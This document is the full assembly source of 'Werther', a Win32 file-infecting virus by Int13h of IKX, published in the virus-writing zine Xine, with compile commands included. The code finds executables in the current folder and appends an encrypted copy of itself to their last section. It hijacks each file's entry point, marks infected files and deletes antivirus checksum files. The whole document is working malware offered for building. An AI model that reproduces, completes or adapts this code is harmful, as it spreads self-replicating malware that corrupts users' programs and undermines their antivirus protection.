   ;                                        /-----------------------------\
   ;                                        | Xine - issue #4 - Phile 213 |
   ;                                        \-----------------------------/


   ;     < < < < < <   WERTHER Virus, coded by Int13h of IKX   > > > > > >
   ;   ___Random encrypted runtime portable executable last section expander___
   ;                    It deletes some AV checksum files.
   ;
   ; COMPILE:
   ; tasm /ml /m3 Werther,,;
   ; tlink32 -Tpe -c -v Werther,Werther,, import32.lib
   ;
   ;
   .386
   .model flat
   jumps                                           ; Still lazy in 32 bits
   locals

   Extrn ExitProcess:PROC

   Location   = 0BFF70000h                         ; Some kewl equates
   Marker     = 12
   ImageBase  = 52
   EntryPRVA  = 40
   PhyOffset  = 20
   PhySize    = 16
   NumObjects = 06
   RVA        = 12
   ObjAlign   = 56
   VirtSize   = 08
   FileAlign  = 60
   ImageSize  = 80
   SectSize   = 40
   ObjFlags   = 36
   Longitud1  = EnFiles-Codigo_Vivo
   Longitud2  = EnMemoria-Codigo_Vivo
   Saltar     = Cifrado-Codigo_Vivo

   .DATA
           db 'J. W. Goethe rules!'                ; Fool data, just 4 tasm
   .CODE

   INICIO: jmp     Codigo_Vivo
   Salida: push    00
           call    ExitProcess                     ; Just return to OS

   CD13 segment para public 'INT13H'
   assume cs:CD13

   Codigo_Vivo:
           pushad                                  ; Save all registers
           call    Delta                           ; For delta offset calculation
   Delta:  pop     edi                             ; EDI=EIP
           sub     edi,offset Delta                ; EDI=delta offset

           lea     esi,[edi+offset Cifrado]
           mov     ecx,((offset EnFiles-offset Cifrado)/2)+1
   Decrypt:db      066h,081h,036h                  ; XOR WORD PTR [ESI],0
     Clave dw      0
           inc     esi
           inc     esi                             ; Increment our index
           loop    Decrypt

   Cifrado:mov     eax,Location
           cmp     word ptr [eax],'ZM'             ; Kernel32 isn't where expected
           jne     Kernel

           push    dword ptr [edi+Retorno+1]       ; Stack return address

           lea     ebx,[edi+APIaddresses]          ; Where to put the addresses
           mov     ecx,10                          ; Ten APIs
           lea     edx,[edi+APIs]                  ; APIs we'll use
   FindAPIs:
           push    ebx ecx edi                     ; I am using Star0's method
           mov     edi,Location                    ; to get APIs directly
           mov     esi,edi                         ; from KERNEL32.DLL
           sub     ebx,ebx
           mov     bx,word ptr [edi+03ch]          ; Get offset of PE header
           add     edi,ebx
           mov     eax,666                         ; Flag as bad
           cmp     dword ptr [edi],000004550h      ; PE signture here?
           jne     Cancel                          ; Nope, leave
           mov     ebx,dword ptr [edi+120]
           lea     edi,[esi+ebx]
           mov     ecx,dword ptr [edi+24]
           mov     ebx,dword ptr [edi+32]
           add     ebx,esi
           mov     ebp,edx
   BuscarCadena:
           mov     eax,dword ptr [ebx]
           add     eax,esi
           mov     eax,dword ptr [eax]
           cmp     dword ptr [edx],eax
           je      ProbarNombre
   Vamos:  mov     edx,ebp
           add     ebx,4
           dec     ecx
           jnz     BuscarCadena
           mov     eax,666                         ; Sign an error
           jmp     Cancel
   ProbarNombre:
           mov     eax,dword ptr [ebx]
           add     eax,esi
   TestarNombre:
           push    eax
           mov     al,byte ptr [eax]
           cmp     byte ptr [edx],al
           pop     eax
           jne     Vamos
           inc     eax
           inc     edx
           cmp     byte ptr [edx+1],0              ; Until the 0...
           jne     TestarNombre
           mov     al,byte ptr [eax]
           cmp     byte ptr [edx],al
           jne     Vamos
           add     edx,2
           push    edx
           mov     eax,dword ptr [edi+24]
           sub     eax,ecx
           shl     eax,1
           add     eax,dword ptr [edi+36]
           sub     ebx,ebx
           add     eax,esi
           mov     bx,word ptr [eax]
           xchg    ebx,eax
           shl     eax,2
           add     eax,dword ptr [edi+28]
           add     eax,esi
           mov     eax,dword ptr [eax]             ; Get it
           add     eax,esi
           pop     edx
   Cancel: pop     edi ecx ebx
           cmp     eax,666                         ; Not found
           je      Errare
           xchg    dword ptr [ebx],eax             ; Save address
           add     ebx,4                           ; And point to the next dword
           loop    FindAPIs

           call    PutInt24h                       ; Set Error Mode
           call    DeleteSuckers                   ; Delete AV files
           lea     eax,[edi+offset Win32FindData]  ; The FindData structure
           push    eax
           lea     eax,[edi+offset Victimas]       ; *.EXE
           push    eax
           call    dword ptr [edi+FindFirstFile]   ; call the API
           mov     dword ptr [edi+SearcHandle],eax ; Save the search handle
   Ciclo:  cmp     eax,0ffffffffh                  ; Ask for error
           je      Errare
           or      eax,eax                         ; No more files?
           jz      Errare

           push    00
           push    00000080h
           push    03
           push    00
           push    00
           push    0C0000000h
           lea     eax,[edi+offset Hallado]        ; Open the found EXE
           push    eax
           call    dword ptr [edi+CreateFile]
           cmp     eax,-1
           je      Cerrar
           mov     dword ptr [edi+FileHandle],eax  ; Save file handle

           push    00
           push    00
           push    0000003ch                       ; Move pointer at offset 03ch
           push    eax
           call    dword ptr [edi+SetFilePointer]

           push    00
           lea     eax,dword ptr [edi+NumOfBytesRead]
           push    eax
           push    04                              ; Number of bytes to read
           lea     eax,dword ptr [edi+PEoffset]    ; Where to read
           push    eax
           push    dword ptr [edi+FileHandle]      ; Handle of our opened file
           call    dword ptr [edi+ReadFile]

           push    00
           push    00
           push    dword ptr [edi+PEoffset]        ; Move pointer to PE
           push    dword ptr [edi+FileHandle]      ; header location
           call    dword ptr [edi+SetFilePointer]

           push    00
           lea     eax,dword ptr [edi+NumOfBytesRead]
           push    eax
           push    000008F8h
           lea     eax,dword ptr [edi+PEHeader]    ; Read the PE header
           push    eax
           push    dword ptr [edi+FileHandle]
           call    dword ptr [edi+ReadFile]

           cmp     word ptr [edi+PEHeader],04550h  ; Is it a PE?
           jne     Cerrar

           cmp     word ptr [edi+PEHeader+Marker],0cd13h ; Already infected?
           je      Cerrar

           sub     eax,eax
           mov     ax,word ptr [edi+PEHeader+NumObjects]
           dec     ax                              ; Number of Objects-1
           mov     ecx,SectSize                    ; Section size=40 bytes
           mul     ecx                             ; Calcule RVA for the
           push    eax                             ; last section
           pop     esi
           lea     esi,[edi+esi+PEHeader+0F8h]     ; ESI will point there

           mov     ecx,dword ptr [edi+PEHeader+ImageBase]
           add     ecx,dword ptr [edi+PEHeader+EntryPRVA]
           mov     dword ptr [edi+Retorno+1],ecx   ; Save the hoste's return

           mov     eax,dword ptr [esi+PhyOffset]
           add     eax,dword ptr [esi+PhySize]
           push    eax                             ; We must write virus here

           mov     eax,dword ptr [esi+RVA]
           add     eax,dword ptr [esi+PhySize]     ; Calculate the new entry point
           mov     dword ptr [edi+PEHeader+EntryPRVA],eax

           mov     ecx,dword ptr [edi+PEHeader+ObjAlign]
           mov     eax,dword ptr [esi+VirtSize]
           add     eax,Longitud2                   ; Expand the last section
           xor     edx,edx                         ; virtual size
           div     ecx
           inc     eax
           mul     ecx
           mov     dword ptr [esi+VirtSize],eax

           mov     ecx,dword ptr [edi+PEHeader+FileAlign]
           mov     eax,dword ptr [esi+PhySize]
           add     eax,Longitud1                   ; Expand the physical size
           sub     edx,edx                         ; of our last section
           div     ecx                             ; (room for virus)
           inc     eax
           mul     ecx
           mov     dword ptr [esi+PhySize],eax

           mov     dword ptr [esi+ObjFlags],0E0000000h
           mov     ecx,dword ptr [edi+PEHeader+FileAlign]
           mov     eax,dword ptr [edi+PEHeader+ImageSize]
           add     eax,Longitud2
           sub     edx,edx
           div     ecx
           inc     eax
           mul     ecx                             ; Update image size (+virus)
           mov     dword ptr [edi+PEHeader+ImageSize],eax
           mov     word ptr [edi+PEHeader+Marker],0cd13h ; Mark as infected!

           pop     eax
           push    00
           push    00
           push    eax                             ; Move to place for virus
           push    dword ptr [edi+FileHandle]
           call    dword ptr [edi+SetFilePointer]
           or      eax,eax
           jz      Cerrar

           call    Encryptor                       ; Generate encrypted virus copy

           push    00
           lea     eax,dword ptr [edi+NumOfBytesRead]
           push    eax
           mov     eax,Longitud1
           push    eax
           lea     eax,dword ptr [edi+CopiaVirus] ; Write virus there
           push    eax
           push    dword ptr [edi+FileHandle]
           call    dword ptr [edi+WriteFile]
           or      eax,eax
           jz      Cerrar

           push    00
           push    00
           push    dword ptr [edi+PEoffset]        ; Move to PE header offset
           push    dword ptr [edi+FileHandle]
           call    dword ptr [edi+SetFilePointer]
           or      eax,eax
           jz      Cerrar

           push    00
           lea     eax,dword ptr [edi+NumOfBytesRead]
           push    eax
           push    000008F8h                       ; Write our modified header
           lea     eax,dword ptr [edi+PEHeader]
           push    eax
           push    dword ptr [edi+FileHandle]
           call    dword ptr [edi+WriteFile]

   Cerrar: push    dword ptr [edi+FileHandle]
           call    dword ptr [edi+CloseHandle]     ; Close the opened file

           lea     eax,[edi+offset Win32FindData]
           push    eax
           push    dword ptr [edi+SearcHandle]
           call    dword ptr [edi+FindNextFile]    ; Look for the next one
           jmp     Ciclo

   Errare: call    RestoreInt24h
           pop     dword ptr [edi+Retorno+1]       ; Original host's entry point
   Kernel: popad
   Retorno:mov     eax,offset Salida
           push    eax                             ; EAX=EIP
           ret                                     ; Run hoste



   DeleteSuckers:                                  ; Delete AV files
           lea     esi,[edi+Borrar]                ; Point to first one
           mov     ecx,4                           ; We have 4 shits
   Killer: push    ecx
           push    esi
           call    dword ptr [edi+DeleteFile]      ; Call our cool API
           add     esi,13                          ; Point to next one
           pop     ecx
           loop    Killer
           ret



   PutInt24h:
           push    1                               ; SEM_FAILCRITICALERRORS
           call    dword ptr [edi+SetErrorMode]
           mov     dword ptr [edi+Anterior],eax    ; Save old flags
           ret



   RestoreInt24h:
           db      0b8h
          Anterior dd 0                            ; Old ErrorMode state
           push    eax
           call    dword ptr [edi+SetErrorMode]    ; Restore it
           ret



   Encryptor:
           call    dword ptr [edi+GetTickCount]
           mov     word ptr [edi+Clave],ax         ; Get random keyword

           push    edi                             ; Save delta offset
           lea     esi,[edi+offset Codigo_Vivo]    ; Copy virus to buffer
           lea     edi,[edi+offset CopiaVirus]
           mov     ecx,Longitud1
           rep     movsb
           pop     edi                             ; Recover delta from stack

           lea     esi,[edi+offset CopiaVirus+Saltar]
           mov     ecx,((offset EnFiles-offset Cifrado)/2)+1
   Cifrar: xor     word ptr [esi],ax               ; Encrypt a word
           inc     esi
           inc     esi
           loop    Cifrar
           ret



   APIs:   db      "FindFirstFileA",0
           db      "FindNextFileA",0
           db      "CreateFileA",0
           db      "SetFilePointer",0
           db      "ReadFile",0
           db      "WriteFile",0
           db      "CloseHandle",0
           db      "DeleteFileA",0
           db      "SetErrorMode",0
           db      "GetTickCount",0

   APIaddresses:
    FindFirstFile       dd 0
    FindNextFile        dd 0
    CreateFile          dd 0
    SetFilePointer      dd 0
    ReadFile            dd 0
    WriteFile           dd 0
    CloseHandle         dd 0
    DeleteFile          dd 0
    SetErrorMode        dd 0
    GetTickCount        dd 0


   TituloVentana   db 'WERTHER VIRUS',0
   TextoVentana    db 'MaDe iN PaRaGuAy by Int13h/IKX',0
   Victimas        db '*.EXE',0
   Borrar          db 'AVP.CRC',0,0,0,0,0,0
                   db 'CHKLIST.MS',0,0,0
                   db 'CHKLIST.CPS',0,0
                   db 'ANTI-VIR.DAT',0
   MsgToMyFriend   db 'Star0: u r rite, stone coding must be prohibited! ;)'

   EnFiles         label byte                      ; Virus limit in files
   ;# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

   SearcHandle     dd 0                            ; For FindFirst/Next
   FileHandle      dd 0                            ; When opening the victims
   NumOfBytesRead  dd 0                            ; For reading function
   PEoffset        dd 0                            ; Offset of PE in files
   Win32FindData   dd 0,0,0,0,0,0,0,0,0,0,0        ; WIN32.FindData Structure
   Hallado         db 0100h dup (0)                ; The found file
                   db 0100h dup (0)
   PEHeader        db 08F8h dup (0)                ; For reading the header
   CopiaVirus      db 1000 dup (0)                 ; Buffer for encryption

   EnMemoria       label byte                      ; Virus limit in memory
   ;# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

   Ends
   End INICIO
